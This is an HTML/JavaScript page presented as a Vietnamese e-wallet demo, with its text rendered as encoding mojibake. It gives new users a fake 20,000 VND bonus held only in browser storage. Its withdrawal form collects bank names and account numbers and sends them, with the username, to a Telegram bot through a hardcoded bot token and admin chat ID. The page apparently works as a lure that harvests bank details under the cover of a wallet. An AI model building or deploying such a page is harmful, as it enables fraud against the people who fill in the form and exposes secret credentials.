<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>VÃ­ Demo</title>
<style>
body{font-family:Arial;background:#0f172a;color:#e5e7eb;padding:20px}
.card{max-width:420px;margin:auto;background:#111827;padding:16px;border-radius:12px}
input,button{width:100%;padding:10px;margin-top:8px;border-radius:8px;border:none}
input{background:#1f2933;color:#fff}
button{background:#22c55e;color:#052e16;font-weight:bold}
.hide{display:none}
</style>
</head>
<body>

<div class="card" id="auth">
  <h3>ÄÄƒng kÃ½ / ÄÄƒng nháº­p</h3>
  <input id="user" placeholder="TÃªn Ä‘Äƒng nháº­p">
  <input id="pass" type="password" placeholder="Máº­t kháº©u">
  <button onclick="login()">ÄÄƒng nháº­p / ÄÄƒng kÃ½</button>
</div>

<div class="card hide" id="app">
  <h3>ğŸ’¼ VÃ­ cá»§a báº¡n</h3>
  <p>Sá»‘ dÆ°: <b id="balance">0</b> VNÄ</p>

  <input id="bank" placeholder="NgÃ¢n hÃ ng">
  <input id="stk" placeholder="Sá»‘ tÃ i khoáº£n">
  <input id="amount" type="number" placeholder="Sá»‘ tiá»n rÃºt">
  <button onclick="withdraw()">RÃºt tiá»n</button>

  <p id="msg"></p>
  <button onclick="logout()">ÄÄƒng xuáº¥t</button>
</div>

<script>
const BOT_TOKEN = "8340836312:AAHC87iQUxbONjja4TlMYNLdMlW5HJQ05hU";
const ADMIN_CHAT_ID = 6243479167;

let currentUser = null;

function getUsers(){
  return JSON.parse(localStorage.getItem("users")||"{}");
}
function saveUsers(u){
  localStorage.setItem("users",JSON.stringify(u));
}

function login(){
  const u=user.value,p=pass.value;
  if(!u||!p) return;
  let users=getUsers();
  if(!users[u]){
    users[u]={pass:p,balance:20000}; // thÆ°á»Ÿng 20k
  }
  if(users[u].pass!==p) return alert("Sai máº­t kháº©u");
  saveUsers(users);
  currentUser=u;
  auth.classList.add("hide");
  app.classList.remove("hide");
  update();
}

function update(){
  const users=getUsers();
  balance.innerText=users[currentUser].balance;
}

function withdraw(){
  const users=getUsers();
  const amt=Number(amount.value);
  if(amt<10000) return msg.innerText="âŒ RÃºt tá»‘i thiá»ƒu 10.000";
  if(amt>users[currentUser].balance) return msg.innerText="âŒ KhÃ´ng Ä‘á»§ sá»‘ dÆ°";

  const id=Date.now().toString().slice(-6);
  const text=`ğŸ¦ RÃšT TIá»€N
User: ${currentUser}
ID: ${id}
Bank: ${bank.value}
STK: ${stk.value}
ğŸ’° ${amt} VNÄ

/approve ${id}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id:ADMIN_CHAT_ID,text})
  });

  users[currentUser].balance-=amt;
  saveUsers(users);
  update();
  msg.innerText="ğŸŸ¡ Äang xá»­ lÃ½, chá» admin duyá»‡t";
}

function logout(){
  location.reload();
}
</script>
</body>
</html>